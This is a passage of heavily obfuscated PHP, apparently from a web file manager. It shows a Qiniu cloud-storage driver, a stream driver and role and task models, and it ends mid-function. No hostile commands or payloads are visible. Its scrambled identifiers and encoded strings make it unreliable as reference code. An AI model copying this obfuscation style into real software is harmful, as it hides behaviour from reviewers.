$_SERVER[ˆ¡¹µ‹Â]; $ûÀêÆÓ  = trim($åôÙÍ«“, $¸ùÛê¡¨[8]); if ($this->_isFolder($ûÀêÆÓ )) { return $this->getPathOuter($ûÀêÆÓ ); } $åôÙÍ«“ = $ûÀêÆÓ  . $¸ùÛê¡¨[8]; $¡Áö®„Ğ = get_path_this($ûÀêÆÓ ); $Ç¸—áá— = $åôÙÍ«“ . $¡Áö®„Ğ; if (!$this->mkfile($Ç¸—áá—)) { return !1; } if (!$this->moveFile($Ç¸—áá—, $åôÙÍ«“)) { $this->delFile($Ç¸—áá—); return !1; } return $this->getPathOuter($ûÀêÆÓ ); } public function copyFile($‘ñ ƒĞİ, $ïˆûš„¬) { $˜ ¢ä­§ = $this->bucketManager->copy($this->bucket, $‘ñ ƒĞİ, $this->bucket, $ïˆûš„¬, !0); return $˜ ¢ä­§ ? !1 : $this->getPathOuter($ïˆûš„¬); } public function moveFile($… ‹»¡Õ, $£–©ÑçØ) { $›Õ¥Äƒä = $this->bucketManager->move($this->bucket, $… ‹»¡Õ, $this->bucket, $£–©ÑçØ, !0); return $›Õ¥Äƒä ? !1 : $this->getPathOuter($£–©ÑçØ); } public function delFile($Éì¼Õ¦›) { if (!$this->exist($Éì¼Õ¦›)) { return !0; } $¯õ«°ÖÕ = $this->bucketManager->delete($this->bucket, $Éì¼Õ¦›); return $¯õ«°ÖÕ ? !1 : !0; } public function delFolder($êÅğœÖ¸) { $úüÎÖÅú =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->exist($êÅğœÖ¸)) { return !0; } $this->listItemCache = !1; $”€Éêıé = $this->fileList($êÅğœÖ¸); $this->listItemCache = !0; $Àç¯âÒÃ = trim($êÅğœÖ¸, $úüÎÖÅú[8]) . $úüÎÖÅú[8]; if (!empty($êÅğœÖ¸) && $êÅğœÖ¸ !== $úüÎÖÅú[228] && !in_array($Àç¯âÒÃ, $”€Éêıé[$úüÎÖÅú[85]])) { $”€Éêıé[$úüÎÖÅú[85]][] = $Àç¯âÒÃ; } $š‚•áŞ· = $this->delByBatch($”€Éêıé[$úüÎÖÅú[86]]); if (!$š‚•áŞ·) { return !1; } $š‚•áŞ· = $this->delByBatch($”€Éêıé[$úüÎÖÅú[85]]); if (!$š‚•áŞ·) { return !1; } return $this->delFile($Àç¯âÒÃ); } private function delByBatch($°í¾¥ô) { foreach (array_chunk($°í¾¥ô, 1000) as $ì€ô—ò˜) { $Í€¿ù¯ = $this->bucketManager->buildBatchDelete($this->bucket, $ì€ô—ò˜); list($”À¾šß¾, $Öğôù¸Œ) = $this->bucketManager->batch($Í€¿ù¯); if ($Öğôù¸Œ) { return !1; } } return !0; } public function rename($ñÊÉïÍ¡, $ÄÛŠñÙÂ) { return $this->renameObject($ñÊÉïÍ¡, $ÄÛŠñÙÂ); } public function fileInfo($Õïù±„, $±ÄÌÖ†² = false, $–àª–Í– = array()) { $Åúİ¿”… =& $_SERVER[ˆ¡¹µ‹Â]; $Ä²Ê¯ÃÌ = array($Åúİ¿”…[32] => $this->pathThis($Õïù±„), $Åúİ¿”…[87] => $this->getPathOuter($Åúİ¿”…[8] . $Õïù±„), $Åúİ¿”…[33] => $Åúİ¿”…[230], $Åúİ¿”…[79] => isset($–àª–Í–[$Åúİ¿”…[1521]]) ? $–àª–Í–[$Åúİ¿”…[1521]] : 0, $Åúİ¿”…[169] => $this->ext($Õïù±„)); if ($±ÄÌÖ†²) { return $Ä²Ê¯ÃÌ; } $Ä²Ê¯ÃÌ[$Åúİ¿”…[231]] = $Ä²Ê¯ÃÌ[$Åúİ¿”…[88]] = 0; $Ä²Ê¯ÃÌ[$Åúİ¿”…[232]] = $Ä²Ê¯ÃÌ[$Åúİ¿”…[233]] = !0; if (empty($–àª–Í–)) { $–àª–Í– = $this->objectMeta($Õïù±„); if (!$–àª–Í–) { return $Ä²Ê¯ÃÌ; } } if (isset($–àª–Í–[$Åúİ¿”…[234]]) && $–àª–Í–[$Åúİ¿”…[234]]) { $Ä²Ê¯ÃÌ[$Åúİ¿”…[235]] = $–àª–Í–[$Åúİ¿”…[234]]; } if (isset($–àª–Í–[$Åúİ¿”…[245]]) && $–àª–Í–[$Åúİ¿”…[245]]) { $Ä²Ê¯ÃÌ[$Åúİ¿”…[235]] = $–àª–Í–[$Åúİ¿”…[245]]; } if (isset($–àª–Í–[$Åúİ¿”…[1522]])) { $Ä²Ê¯ÃÌ[$Åúİ¿”…[88]] = substr($–àª–Í–[$Åúİ¿”…[1522]] . $Åúİ¿”…[12], 0, 10); } if (isset($–àª–Í–[$Åúİ¿”…[1521]])) { $Ä²Ê¯ÃÌ[$Åúİ¿”…[79]] = $–àª–Í–[$Åúİ¿”…[1521]]; } return $Ä²Ê¯ÃÌ; } public function folderInfo($Å—°², $Û¿í×ïû = false) { $Ä×õÉ¿Ô =& $_SERVER[ˆ¡¹µ‹Â]; $¯çÓùú = array($Ä×õÉ¿Ô[32] => $this->pathThis($Å—°²), $Ä×õÉ¿Ô[87] => $this->getPathOuter($Ä×õÉ¿Ô[8] . $Å—°²), $Ä×õÉ¿Ô[33] => $Ä×õÉ¿Ô[78]); if ($Û¿í×ïû) { return $¯çÓùú; } $¯çÓùú[$Ä×õÉ¿Ô[231]] = $¯çÓùú[$Ä×õÉ¿Ô[88]] = 0; $¯çÓùú[$Ä×õÉ¿Ô[232]] = $¯çÓùú[$Ä×õÉ¿Ô[233]] = !0; $Å—°² = rtrim($Å—°², $Ä×õÉ¿Ô[8]) . $Ä×õÉ¿Ô[8]; $Êï¸ğ™ö = $this->objectMeta($Å—°²); if (isset($Êï¸ğ™ö[$Ä×õÉ¿Ô[1522]])) { $¯çÓùú[$Ä×õÉ¿Ô[88]] = substr($Êï¸ğ™ö[$Ä×õÉ¿Ô[1522]] . $Ä×õÉ¿Ô[12], 0, 10); } return $¯çÓùú; } public function listPath($Û‰¨Œ¡, $Ë®ˆ³íË = false) { $ºû¦ÉÒ… =& $_SERVER[ˆ¡¹µ‹Â]; $‚¨©ç« = $this->fileList($Û‰¨Œ¡, $ºû¦ÉÒ…[8], !0); foreach ($‚¨©ç«[$ºû¦ÉÒ…[85]] as $ª®ÔŠ½… => $šÈŸÒ®) { $‚¨©ç«[$ºû¦ÉÒ…[85]][$ª®ÔŠ½…] = $this->folderInfo($šÈŸÒ®, $Ë®ˆ³íË); } foreach ($‚¨©ç«[$ºû¦ÉÒ…[86]] as $ª®ÔŠ½… => $šÈŸÒ®) { $‚¨©ç«[$ºû¦ÉÒ…[86]][$ª®ÔŠ½…] = $this->fileInfo($šÈŸÒ®[$ºû¦ÉÒ…[97]], $Ë®ˆ³íË, $šÈŸÒ®); } return $‚¨©ç«; } public function has($Üôå‘‘©, $Ş×´Ó“Û = false, $©œ•›¤¶ = true) { $ÍĞ¹´ =& $_SERVER[ˆ¡¹µ‹Â]; $Üôå‘‘© = trim($Üôå‘‘©, $ÍĞ¹´[8]); $ß ºøê = empty($Üôå‘‘©) && $Üôå‘‘© !== $ÍĞ¹´[228] ? $ÍĞ¹´[12] : $Üôå‘‘© . $ÍĞ¹´[8]; $ÓÌˆ–÷ = $ÍĞ¹´[12]; $ß«±–¦å = 500; $øÏú·ŠÒ = $ÍĞ¹´[8]; $üÛ¤‚Àí = $ïÑíØ = 0; while (!0) { check_abort(); list($‰ÍºÅ˜§, $è”íöµÁ) = $this->bucketManager->listFiles($this->bucket, $ß ºøê, $ÓÌˆ–÷, $ß«±–¦å, $øÏú·ŠÒ); if ($è”íöµÁ) { break; } $ÓÌˆ–÷ = array_key_exists($ÍĞ¹´[1467], $‰ÍºÅ˜§) ? $ÓÌˆ–÷ = $‰ÍºÅ˜§[$ÍĞ¹´[1523]] : $ÍĞ¹´[12]; if ($Ş×´Ó“Û) { if (!empty($‰ÍºÅ˜§[$ÍĞ¹´[1524]])) { $üÛ¤‚Àí += count($‰ÍºÅ˜§[$ÍĞ¹´[1524]]); } if (!empty($‰ÍºÅ˜§[$ÍĞ¹´[1525]])) { $ïÑíØ += count($‰ÍºÅ˜§[$ÍĞ¹´[1525]]); } if ($ÓÌˆ–÷ === $ÍĞ¹´[12]) { break; } continue; } if ($©œ•›¤¶) { if (!empty($‰ÍºÅ˜§[$ÍĞ¹´[1524]])) { return !0; } } else { if (!empty($‰ÍºÅ˜§[$ÍĞ¹´[1525]])) { return !0; } } if ($ÓÌˆ–÷ === $ÍĞ¹´[12]) { break; } } if ($Ş×´Ó“Û) { return array($ÍĞ¹´[239] => $üÛ¤‚Àí, $ÍĞ¹´[240] => $ïÑíØ); } return !1; } public function listAll($çÀÜìûš) { $•ë©•‘Ê =& $_SERVER[ˆ¡¹µ‹Â]; $¾é·¾¦› = $this->fileList($çÀÜìûš, $•ë©•‘Ê[12], !0); $•§€´Êã = array_to_keyvalue($¾é·¾¦›[$•ë©•‘Ê[86]], $•ë©•‘Ê[32]); foreach ($¾é·¾¦›[$•ë©•‘Ê[85]] as $¸ÇÔú) { if (is_string($¸ÇÔú)) { $•§€´Êã[$¸ÇÔú] = array($•ë©•‘Ê[79] => 0); } } return $this->listAllFiles($çÀÜìûš, $•§€´Êã); } private function fileList($ÄçŞ€á—, $Ê¶ã‹©¦ = '', $Ë®µù²ƒ = 0) { $·ŞÙ”œá =& $_SERVER[ˆ¡¹µ‹Â]; $ÄçŞ€á— = trim($ÄçŞ€á—, $·ŞÙ”œá[8]); $§®«Œşş = empty($ÄçŞ€á—) && $ÄçŞ€á— !== $·ŞÙ”œá[228] ? $·ŞÙ”œá[12] : $ÄçŞ€á— . $·ŞÙ”œá[8]; $ˆŠ£ªö = $·ŞÙ”œá[12]; $ÉûØüëÏ = 1000; $¿€¿ß“¸ = $Ø£¦ÔÚ• = array(); while (!0) { check_abort(); list($·âÅçï¸, $È²”°Ğ) = $this->bucketManager->listFiles($this->bucket, $§®«Œşş, $ˆŠ£ªö, $ÉûØüëÏ, $Ê¶ã‹©¦); if ($È²”°Ğ) { break; } $ˆŠ£ªö = array_key_exists($·ŞÙ”œá[1467], $·âÅçï¸) ? $ˆŠ£ªö = $·âÅçï¸[$·ŞÙ”œá[1523]] : $·ŞÙ”œá[12]; $Ü´èÔ° = isset($·âÅçï¸[$·ŞÙ”œá[1524]]) ? $·âÅçï¸[$·ŞÙ”œá[1524]] : array(); $¯à¾ãü¢ = isset($·âÅçï¸[$·ŞÙ”œá[1525]]) ? $·âÅçï¸[$·ŞÙ”œá[1525]] : array(); foreach ($Ü´èÔ° as $õÒ»ÆÅ) { if ($õÒ»ÆÅ[$·ŞÙ”œá[97]] == $§®«Œşş) { continue; } $†Öî÷ş = $õÒ»ÆÅ[$·ŞÙ”œá[97]]; $‹ÚûÊŒË = $õÒ»ÆÅ[$·ŞÙ”œá[1521]]; $õÒ»ÆÅ[$·ŞÙ”œá[79]] = $‹ÚûÊŒË; $¨–‡´’ = $‹ÚûÊŒË == 0 && substr($†Öî÷ş, strlen($†Öî÷ş) - 1, 1) == $·ŞÙ”œá[8] ? !0 : !1; $this->cacheMethodInfoSet($†Öî÷ş, $¨–‡´’, $õÒ»ÆÅ); if ($¨–‡´’) { $¿€¿ß“¸[] = $†Öî÷ş; continue; } $Ø£¦ÔÚ•[] = $Ë®µù²ƒ ? $õÒ»ÆÅ : $†Öî÷ş; } foreach ($¯à¾ãü¢ as $†Öî÷ş) { if ($†Öî÷ş == $§®«Œşş) { continue; } $¿€¿ß“¸[] = $†Öî÷ş; $this->cacheMethodInfoSet($†Öî÷ş, !0); } if ($ˆŠ£ªö === $·ŞÙ”œá[12]) { break; } } $this->cacheMethodInfoSet($ÄçŞ€á—, !0); return array($·ŞÙ”œá[85] => $¿€¿ß“¸, $·ŞÙ”œá[86] => $Ø£¦ÔÚ•); } public function canRead($ô•³ÜæÚ) { return $this->exist($ô•³ÜæÚ) ? !0 : !1; } public function canWrite($æğğíæì) { return $this->exist($æğğíæì) ? !0 : !1; } public function getContent($¨¦ÁÁ¹Š) { return $this->fileSubstr($¨¦ÁÁ¹Š, 0, -1); } public function setContent($ó¹Äâ¯°, $Û¦†ö¸« = '') { $ã¿Ã·¸ = $this->tempFile($this->pathThis($ó¹Äâ¯°)); file_put_contents($ã¿Ã·¸, $Û¦†ö¸«); if ($this->upload($ó¹Äâ¯°, $ã¿Ã·¸)) { $this->tempFileRemve($ã¿Ã·¸); return !0; } return !1; } public function refreshUrls($ı¤ş‹Éï) { $íï¯İ¿¯ =& $_SERVER[ˆ¡¹µ‹Â]; $‘‚«²ƒ = array(); if (is_array($ı¤ş‹Éï)) { foreach ($ı¤ş‹Éï as $¼¿Ë¡¿) { $‘‚«²ƒ[] = $this->link($¼¿Ë¡¿); } } else { $‘‚«²ƒ[] = $this->link($ı¤ş‹Éï); } $×Êúƒ¿š = new Qiniu\Cdn\CdnManager($this->auth); list($ÒŸ´íä“, $÷Õñ‚Òª) = $×Êúƒ¿š->refreshUrls($‘‚«²ƒ); if ($÷Õñ‚Òª) { return !1; } return $ÒŸ´íä“[$íï¯İ¿¯[1257]] == $íï¯İ¿¯[826] ? !0 : !1; } public function fileSubstr($ğ˜ĞÜê, $„ÕÀ¢ƒì, $€†­‚ŞÁ) { $âêğŸæˆ =& $_SERVER[ˆ¡¹µ‹Â]; if (!($ƒŸã´¼Ş = $this->link($ğ˜ĞÜê))) { return !1; } $â÷Ë¤à = !1; if ($€†­‚ŞÁ > 0) { $‚ëÄàà  = $„ÕÀ¢ƒì + $€†­‚ŞÁ - 1; $â÷Ë¤à = array($âêğŸæˆ[1526] . $„ÕÀ¢ƒì . $âêğŸæˆ[462] . $‚ëÄàà ); } $»­àûæ = url_request($ƒŸã´¼Ş, $âêğŸæˆ[261], !1, $â÷Ë¤à); return $»­àûæ[$âêğŸæˆ[817]] ? $»­àûæ[$âêğŸæˆ[1280]] : !1; } public function upload($¿êÄÑÊ®, $ùå°•¦, $àèñ¢˜ˆ = false, $»§ÛŠÒ© = REPEAT_REPLACE) { $õ—î¤Ë = new Qiniu\Storage\UploadManager(); $–û›‰ ¶ = $this->auth->uploadToken($this->bucket, $¿êÄÑÊ®); $ ÜÜºÁ¹ = get_file_mime(get_path_ext($ùå°•¦)); list($™Ú‡Ÿíù, $â„ñêêÇ) = $õ—î¤Ë->putFile($–û›‰ ¶, $¿êÄÑÊ®, $ùå°•¦, null, $ ÜÜºÁ¹); return $â„ñêêÇ ? !1 : $this->getPathOuter($¿êÄÑÊ®); } public function uploadFormData($ñ¿Ê ³Æ, $ûŞÂí™ = 3600) { return $this->uploadToken($ñ¿Ê ³Æ, $ûŞÂí™); } public function multiUploadFormData($‡ê¡êÆÏ, $Åñºä± = 3600) { return $this->uploadToken($‡ê¡êÆÏ, $Åñºä±); } private function uploadToken($±¹±¬, $´¹œŸ²à = 3600) { $úûÁ®Ï =& $_SERVER[ˆ¡¹µ‹Â]; $Ò•ÁÁÀ¹ = $´¹œŸ²à; $®ÕÎ™ï† = array($úûÁ®Ï[1527] => $úûÁ®Ï[1528]); $ÁÒµ²×Ğ = $±¹±¬; $ù½±Ò›« = $this->auth->uploadToken($this->bucket, $ÁÒµ²×Ğ, $Ò•ÁÁÀ¹, $®ÕÎ™ï†, !0); $ó³‹ŸÖü = empty($this->region) || $this->region == $úûÁ®Ï[1529] ? $úûÁ®Ï[12] : $úûÁ®Ï[462] . $this->region; $„‘ÎÅ´ = http_type() . "\x3a\57\57\x75\x70\x6c\157\141\x64{$ó³‹ŸÖü}\x2e\161\x69\156\x69\165\160\56\143\x6f\155\x2f"; return array($úûÁ®Ï[1530] => $ù½±Ò›«, $úûÁ®Ï[1531] => $„‘ÎÅ´); } public function download($ÂäùˆÜ, $¾Üúª¶) { $–øš½ãó = IO::getPathInner(IO::mkfile($¾Üúª¶)); if (!($ºÁïÓÓï = $this->link($ÂäùˆÜ))) { return !1; } $ğâŸŒ = 0; $Ôïëşø = 1024 * 200; $§î°é›ç = fopen($–øš½ãó, $_SERVER[ˆ¡¹µ‹Â][1532]); while (!0) { $Í”£‰Èæ = $this->fileSubstr($ÂäùˆÜ, $ğâŸŒ, $Ôïëşø); if ($Í”£‰Èæ === !1) { return !1; } fwrite($§î°é›ç, $Í”£‰Èæ); $ğâŸŒ += $Ôïëşø; if (strlen($Í”£‰Èæ) < $Ôïëşø) { break; } } fclose($§î°é›ç); return $¾Üúª¶; } public function link($ÊÖã“Ğô, $™ˆ™Ò× = '') { if (!$this->isFile($ÊÖã“Ğô)) { return !1; } $¨üñ§« = $this->getHost() . $_SERVER[ˆ¡¹µ‹Â][8] . $this->pathEncode($ÊÖã“Ğô) . $™ˆ™Ò×; return $this->auth->privateDownloadUrl($¨üñ§«, 3600 * 12); } public function fileOut($¼Ù´ä†‰, $Èô½Ûàô = false, $¦İú³—ğ = false, $…¹Ô®óª = '') { $à»³ı…¥ =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->isFileOutServer()) { return $this->fileOutServer($¼Ù´ä†‰, $Èô½Ûàô, $¦İú³—ğ, $…¹Ô®óª); } if (!$¦İú³—ğ) { $¦İú³—ğ = $this->pathThis($¼Ù´ä†‰); } $éàª×Òş = $Èô½Ûàô ? $à»³ı…¥[1533] . rawurlencode($¦İú³—ğ) : $à»³ı…¥[12]; $ÄŞã“ï» = $this->link($¼Ù´ä†‰, $éàª×Òş); $this->fileOutLink($ÄŞã“ï»); } public function fileOutServer($ÄŞô‡, $˜Ïïä = false, $˜ù€Ò¼¥ = false, $²Ì¢Òœç = '') { parent::fileOut($ÄŞô‡, $˜Ïïä, $˜ù€Ò¼¥, $²Ì¢Òœç); } public function fileOutImage($Ú¼»¬ú¨, $ˆ¾Ú‘ñ« = 250) { if ($this->size($Ú¼»¬ú¨) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ú¼»¬ú¨, $ˆ¾Ú‘ñ«); } $éØùº±‚ = $this->link($Ú¼»¬ú¨, $_SERVER[ˆ¡¹µ‹Â][1534] . $ˆ¾Ú‘ñ«); $this->fileOutLink($éØùº±‚); } public function fileOutImageServer($ÜÑÌÅòß, $¨¬åâ£ö = 250) { parent::fileOutImage($ÜÑÌÅòß, $¨¬åâ£ö); } public function hashMd5($òÌÑşšŠ) { $«³Œáµ» =& $_SERVER[ˆ¡¹µ‹Â]; $›÷Êç­ì = $this->objectMeta($òÌÑşšŠ); return isset($›÷Êç­ì[$«³Œáµ»[245]]) ? $›÷Êç­ì[$«³Œáµ»[245]] : !1; $Õ¾İıáŸ = $this->link($òÌÑşšŠ, $«³Œáµ»[1535]); } public function size($Å±Ñú) { $ıÉ€ôî = $this->objectMeta($Å±Ñú); return $ıÉ€ôî ? $ıÉ€ôî[$_SERVER[ˆ¡¹µ‹Â][79]] : 0; } public function info($¢Îë‰) { if ($this->isFolder($¢Îë‰)) { return $this->folderInfo($¢Îë‰); } else { if ($this->isFile($¢Îë‰)) { return $this->fileInfo($¢Îë‰); } } return !1; } public function exist($ã×‰ÇÜ¥) { return $this->isFile($ã×‰ÇÜ¥) || $this->isFolder($ã×‰ÇÜ¥); } public function isFile($Ã‰½îí) { return !$this->isFolder($Ã‰½îí) && $this->objectMeta($Ã‰½îí); } public function isFolder($¸ÛœÃû­) { return $this->cacheMethod($_SERVER[ˆ¡¹µ‹Â][179], $¸ÛœÃû­); } protected function objectMeta($ùƒÕ‹Ó) { return $this->cacheMethod($_SERVER[ˆ¡¹µ‹Â][181], $ùƒÕ‹Ó); } protected function _objectMeta($…Ã¹ëÆ) { $¯ç¾äÚŸ =& $_SERVER[ˆ¡¹µ‹Â]; list($óë¾ĞŸô, $»âÒ‚Àó) = $this->bucketManager->stat($this->bucket, $…Ã¹ëÆ); if ($óë¾ĞŸô) { $óë¾ĞŸô[$¯ç¾äÚŸ[79]] = intval($óë¾ĞŸô[$¯ç¾äÚŸ[1521]]); } return $óë¾ĞŸô; } protected function _isFolder($ûİºÏî) { $ËêÑıš¦ =& $_SERVER[ˆ¡¹µ‹Â]; if ($ûİºÏî == $ËêÑıš¦[12] || $ûİºÏî == $ËêÑıš¦[8]) { return !0; } list($¿ïèä‘Œ, $åµ¢¿’’) = $this->bucketManager->listFiles($this->bucket, trim($ûİºÏî, $ËêÑıš¦[8]) . $ËêÑıš¦[8], $ËêÑıš¦[12], 1, $ËêÑıš¦[8]); return !empty($¿ïèä‘Œ[$ËêÑıš¦[1524]]) || !empty($¿ïèä‘Œ[$ËêÑıš¦[1525]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($äìÌ€õ, $ªÎ·”Ÿõ = 0) { parent::__construct(); $this->source = $äìÌ€õ; $this->sourceSize = $ªÎ·”Ÿõ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ä×˜Ëãú = false) { return $this->sourceSize; } public function getContent($¡²œ–™ = false) { return $this->fileSubstr($¡²œ–™, 0, $this->sourceSize); } public function fileSubstr($”è¹áÄ = false, $ÈÖ›×şê = 0, $†Éã§ª = 0) { if (!$†Éã§ª) { $†Éã§ª = $this->sourceSize; } $é„˜§ = $this->sourceSize - $ÈÖ›×şê; if ($†Éã§ª >= $é„˜§) { $†Éã§ª = $é„˜§; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ÈÖ›×şê, $†Éã§ª); } if ($this->sourceType == self::TYPE_FILE) { if ($†Éã§ª <= 0) { return $_SERVER[ˆ¡¹µ‹Â][12]; } $³®§œËñ = ftell($this->source); fseek_64($this->source, $³®§œËñ + $ÈÖ›×şê); $š€¯õıç = @fread($this->source, $†Éã§ª); fseek_64($this->source, $³®§œËñ); return $š€¯õıç; } } public function hashMd5($“ş„°Ô = false) { return md5($this->getContent()); } public static function hash($Çç¦‡ğƒ, $ªŒ£ñ¶Ï = 0) { $ÊıÈ’±ò = new PathDriverStream($Çç¦‡ğƒ, $ªŒ£ñ¶Ï); return $ÊıÈ’±ò->hashSimple($Çç¦‡ğƒ); } public static function md5($‡“Ó¸ğ«, $ìöë¹¿© = 0) { $İä§ÎÔĞ = new PathDriverStream($‡“Ó¸ğ«, $ìöë¹¿©); return $İä§ÎÔĞ->hashMd5($‡“Ó¸ğ«); } } goto D±õŒÈ¸; b‰ÅÚï©Ã: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\162\x6f\154\145\114\x69\163\164"; public $field = array("\156\141\155\x65", "\x61\x75\x74\x68", "\154\x61\142\145\x6c", "\x64\x69\163\x70\x6c\141\x79", "\163\x79\x73\164\x65\155", "\144\x65\163\x63", "\151\x67\x6e\157\x72\145\105\170\x74", "\x69\147\x6e\x6f\162\x65\106\x69\154\x65\123\151\172\x65", "\x61\144\155\x69\x6e\151\x73\x74\162\141\x74\157\162", "\x73\157\x72\164"); public function listData($¬öôºß› = false, $ÖëÅÂóó = "\163\x6f\x72\x74", $İö‚Å—Ü = false) { $â˜ÈµŠİ =& $_SERVER[ˆ¡¹µ‹Â]; $ÁÈ˜÷äÛ = parent::listData($¬öôºß›, $ÖëÅÂóó, $İö‚Å—Ü); if (!$¬öôºß›) { foreach ($ÁÈ˜÷äÛ as $œàƒíÃ„ => $ëÅï±àÓ) { if ($ëÅï±àÓ[$â˜ÈµŠİ[2170]] == 1) { $ÁÈ˜÷äÛ[$œàƒíÃ„][$â˜ÈµŠİ[526]] = LNG($â˜ÈµŠİ[2436]); } } } return $ÁÈ˜÷äÛ; } public function update($…¬Úû²å, $ğòú×÷é) { $³ŞÚ©ºç =& $_SERVER[ˆ¡¹µ‹Â]; $ÅœâÖùå = parent::listData($…¬Úû²å); $‹è”ŸÁÑ = $this->findByName($ğòú×÷é[$³ŞÚ©ºç[32]]); if (!$ÅœâÖùå || $‹è”ŸÁÑ && $‹è”ŸÁÑ[$³ŞÚ©ºç[475]] != $ÅœâÖùå[$³ŞÚ©ºç[475]]) { return !1; } if ($‹è”ŸÁÑ[$³ŞÚ©ºç[2170]] == 1) { $ğòú×÷é = array($³ŞÚ©ºç[32] => $ğòú×÷é[$³ŞÚ©ºç[32]], $³ŞÚ©ºç[1985] => $ğòú×÷é[$³ŞÚ©ºç[1985]]); } $this->filterAuth($ğòú×÷é[$³ŞÚ©ºç[487]]); return parent::update($…¬Úû²å, $ğòú×÷é); } public function remove($â½ÎÓ) { $‰œŠË¦ı = parent::listData($â½ÎÓ); if (!$‰œŠË¦ı || $‰œŠË¦ı[$_SERVER[ˆ¡¹µ‹Â][191]]) { return !1; } return parent::remove($â½ÎÓ); } public function add($ê’˜ÕïÒ) { $¨‹ãõÙÍ =& $_SERVER[ˆ¡¹µ‹Â]; $÷ªø×ù¥ = $ê’˜ÕïÒ[$¨‹ãõÙÍ[32]]; if ($this->findByName($÷ªø×ù¥)) { return !1; } $Äœ»©¤ = array($¨‹ãõÙÍ[494] => $÷ªø×ù¥, $¨‹ãõÙÍ[1968] => $¨‹ãõÙÍ[12], $¨‹ãõÙÍ[1964] => $¨‹ãõÙÍ[1972], $¨‹ãõÙÍ[2437] => 1, $¨‹ãõÙÍ[1967] => 0, $¨‹ãõÙÍ[2438] => 0, $¨‹ãõÙÍ[1966] => $this->getSort()); $ê’˜ÕïÒ = array_merge($Äœ»©¤, $ê’˜ÕïÒ); $this->filterAuth($ê’˜ÕïÒ[$¨‹ãõÙÍ[487]]); return parent::insert($ê’˜ÕïÒ); } private function getSort() { $–å€êŠµ =& $_SERVER[ˆ¡¹µ‹Â]; $¸Îò´ò½ = parent::listData(); $ëĞæ°Îä = array_to_keyvalue($¸Îò´ò½, $–å€êŠµ[12], $–å€êŠµ[1986]); return empty($ëĞæ°Îä) ? 0 : max($ëĞæ°Îä) + 1; } private function filterAuth(&$Ÿæ„–´) { $îìŒÛ¤´ =& $_SERVER[ˆ¡¹µ‹Â]; $¥ê•„†À = array(); $ô¨ÒÜôö = array_filter(explode($îìŒÛ¤´[50], $Ÿæ„–´)); foreach ($ô¨ÒÜôö as $Ÿæ„–´) { $âı“Üİò = explode($îìŒÛ¤´[10], $Ÿæ„–´); if ($âı“Üİò[0] == $îìŒÛ¤´[2439] && $âı“Üİò[1] != $îìŒÛ¤´[1268]) { $­è•ë  = $âı“Üİò[0] . $îìŒÛ¤´[10] . $âı“Üİò[1] . $îìŒÛ¤´[2440]; if (!in_array($­è•ë , $ô¨ÒÜôö)) { $¥ê•„†À[] = $­è•ë ; } } $¥ê•„†À[] = $Ÿæ„–´; } $Ÿæ„–´ = implode($îìŒÛ¤´[50], $¥ê•„†À); } public function findRoleDefault() { $ ½õØ·¿ =& $_SERVER[ˆ¡¹µ‹Â]; $ÍâÁ´ = parent::listData(); $›¯øÏğ× = !1; foreach ($ÍâÁ´ as $ôöËøÕÜ) { if (!$ôöËøÕÜ || $ôöËøÕÜ[$ ½õØ·¿[1984]] == $ ½õØ·¿[228] || $ôöËøÕÜ[$ ½õØ·¿[2170]] == 1) { continue; } if (strstr($ôöËøÕÜ[$ ½õØ·¿[487]], $ ½õØ·¿[2441])) { continue; } if (!strstr($ôöËøÕÜ[$ ½õØ·¿[487]], $ ½õØ·¿[2442])) { continue; } if (!$›¯øÏğ×) { $›¯øÏğ× = $ôöËøÕÜ; continue; } $ôíŸ¼âà = explode($ ½õØ·¿[50], $›¯øÏğ×[$ ½õØ·¿[487]]); $´ÖšˆÙÜ = explode($ ½õØ·¿[50], $ôöËøÕÜ[$ ½õØ·¿[487]]); if (count($ôíŸ¼âà) > count($´ÖšˆÙÜ)) { $›¯øÏğ× = $ôöËøÕÜ; } } return $›¯øÏğ× ? $›¯øÏğ×[$ ½õØ·¿[475]] : $ ½õØ·¿[12]; } public function sort($£´ØÔ´ö, $ÑÉáÄ‡ª) { return parent::update($£´ØÔ´ö, $ÑÉáÄ‡ª); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\x74\141\x73\x6b\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\x74\171\x70\145", "\x65\166\x65\x6e\164", "\x74\x69\155\145", "\x64\x65\x73\143", "\163\x79\x73\164\x65\155", "\x65\156\x61\x62\x6c\145", "\x6c\141\x73\164\122\165\x6e", "\x73\157\162\x74"); public function listData($è˜ô·ª = false, $û±şŠÛ• = "\x73\x6f\x72\164", $¶¯şÛ¯Š = false) { return parent::listData($è˜ô·ª, $û±şŠÛ•, $¶¯şÛ¯Š); } public function add($©ëÔÜö±) { $­¾£œó =& $_SERVER[ˆ¡¹µ‹Â]; $°±—ˆœÜ = $this->findByName($©ëÔÜö±[$­¾£œó[32]]); if ($°±—ˆœÜ) { return !1; } $©ëÔÜö±[$­¾£œó[1714]] = 0; $©ëÔÜö±[$­¾£œó[1986]] = $this->getSort(); return parent::insert($©ëÔÜö±); } private function getSort() { $ÕšÅ€ş =& $_SERVER[ˆ¡¹µ‹Â]; $£Ú¦¶ç = parent::listData(); $É®µ‘­ë = array_to_keyvalue($£Ú¦¶ç, $ÕšÅ€ş[12], $ÕšÅ€ş[1986]); return empty($É®µ‘­ë) ? 0 : max($É®µ‘­ë) + 1; } public function update($ïëçÙñù, $§è×ı‰Á) { $è¥¢Ú—› =& $_SERVER[ˆ¡¹µ‹Â]; $Ş–†Œıâ = $this->listData($ïëçÙñù); $†­ÎÃ‚· = $this->findByName($§è×ı‰Á[$è¥¢Ú—›[32]]); if (!$Ş–†Œıâ || $†­ÎÃ‚· && $†­ÎÃ‚·[$è¥¢Ú—›[475]] != $Ş–†Œıâ[$è¥¢Ú—›[475]]) { return !1; } return parent::update($ïëçÙñù, $§è×ı‰Á); } public function remove($ÜËÌ×Ÿ, $Ş“Ú†½ò = false) { $Çå¶ŒĞ– =& 